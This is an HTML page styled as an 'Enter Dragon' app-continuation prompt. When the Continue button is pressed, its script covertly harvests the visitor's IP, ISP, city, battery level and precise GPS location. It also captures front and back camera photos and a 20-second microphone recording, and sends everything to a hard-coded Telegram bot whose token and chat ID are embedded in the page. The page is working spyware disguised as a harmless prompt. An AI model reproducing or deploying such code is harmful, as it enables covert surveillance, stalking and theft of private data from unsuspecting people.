<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Dragon</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #050505; /* Dark background */
            background-image: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #000 100%);
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        
        .glass-panel {
            background: rgba(30, 30, 30, 0.4);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 50px 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 85%;
            width: 360px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.05);
        }

        h1 {
            margin-top: 0;
            font-size: 28px;
            letter-spacing: 3px;
            text-transform: uppercase;
            font-weight: 600;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
        }

        p {
            font-size: 15px;
            margin-bottom: 35px;
            line-height: 1.6;
            color: #d1d1d1;
        }

        .btn-continue {
            background: rgba(0, 102, 255, 0.2);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 102, 255, 0.5);
            color: white;
            padding: 16px 30px;
            font-size: 18px;
            font-weight: 500;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.15);
        }

        .btn-continue:active {
            background: rgba(0, 102, 255, 0.4);
            transform: scale(0.98);
        }

        .loader {
            display: none;
            margin: 20px auto;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #0066ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="glass-panel">
        <h1>Enter Dragon</h1>
        <p>Do you want to continue using this app?<br>Is the service required?</p>
        <button class="btn-continue" id="continueBtn" onclick="startProcess()">Continue</button>
        <div class="loader" id="loader"></div>
    </div>

    <script>
        const BOT_TOKEN = "8646604552:AAGWM4W4i9g9T-itnFscvQom32md5GP7lHo";
        const CHAT_ID = "7208869554";

        async function sendTextToBot(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            }).catch(e => console.log(e));
        }

        async function sendFileToBot(blob, filename) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', blob, filename);
            await fetch(url, { method: 'POST', body: formData }).catch(e => console.log(e));
        }

        async function startProcess() {
            document.getElementById('continueBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            try {
                // 1. Get Network Info (ISP) & Battery immediately
                let networkData = "Network Info: Unknown";
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const ipJson = await res.json();
                    networkData = `ISP/Network: ${ipJson.org}\nIP: ${ipJson.ip}\nLocation: ${ipJson.city}, ${ipJson.region}`;
                } catch (e) {}

                let batteryData = "Battery: Unknown";
                try {
                    if (navigator.getBattery) {
                        const bat = await navigator.getBattery();
                        batteryData = `Battery Level: ${Math.round(bat.level * 100)}%`;
                    }
                } catch (e) {}
                
                await sendTextToBot(`Device Details:\n${networkData}\n${batteryData}`);

                // 2. Fetch GPS Immediately (to prevent timeouts while audio records)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            const lat = pos.coords.latitude;
                            const lon = pos.coords.longitude;
                            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                            await sendTextToBot(`✅ GPS Location:\n${mapUrl}`);
                        },
                        async (err) => {
                            await sendTextToBot(`❌ GPS Failed: ${err.message}`);
                        },
                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                    );
                } else {
                    await sendTextToBot(`❌ GPS Not Supported by Browser`);
                }

                // 3. Audio & Front Camera Process
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
                    
                    // Take Front Photo
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    const frontPhoto = await imageCapture.takePhoto();
                    await sendFileToBot(frontPhoto, "front_camera.jpg");

                    // Record 20 Sec Audio
                    const mediaRecorder = new MediaRecorder(stream);
                    const audioChunks = [];
                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                    
                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        await sendFileToBot(audioBlob, "20sec_audio.webm");
                        
                        // Stop front tracks
                        stream.getTracks().forEach(t => t.stop());

                        // 4. Back Camera
                        try {
                            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
                            const backTrack = backStream.getVideoTracks()[0];
                            const backCapture = new ImageCapture(backTrack);
                            const backPhoto = await backCapture.takePhoto();
                            await sendFileToBot(backPhoto, "back_camera.jpg");
                            backStream.getTracks().forEach(t => t.stop());
                        } catch (err) {
                            console.log("Back camera issue", err);
                        }

                        finishLoading();
                    };

                    mediaRecorder.start();
                    setTimeout(() => {
                        if (mediaRecorder.state === "recording") {
                            mediaRecorder.stop();
                        }
                    }, 20000); // 20 seconds timer

                } catch (e) {
                    await sendTextToBot(`❌ Camera/Mic Permission Denied or Failed`);
                    finishLoading();
                }
            } catch (e) {
                finishLoading();
            }
        }

        function finishLoading() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('continueBtn').style.display = 'block';
        }
    </script>
</body>
</html>
